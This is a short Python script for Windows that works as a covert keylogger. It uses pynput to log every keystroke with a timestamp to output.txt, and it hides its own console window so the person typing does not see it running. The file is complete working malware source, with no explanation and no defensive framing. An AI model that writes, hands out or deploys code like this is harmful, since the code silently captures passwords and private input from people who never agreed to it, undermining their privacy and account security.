from pynput import keyboard
import logging
import win32console, win32gui

log_dir = "output.txt"

with open(log_dir, 'w') as f:
    f.write('')
    f.close()

logging.basicConfig(filename = (log_dir), level=logging.DEBUG, format='%(asctime)s: %(message)s')

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def on_press(key):
    try:
        if key == keyboard.Key.shift_r:
            exit(1)
        logging.info(str(key))
    except Exception as e:
        logging.info(e)
        exit(1)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()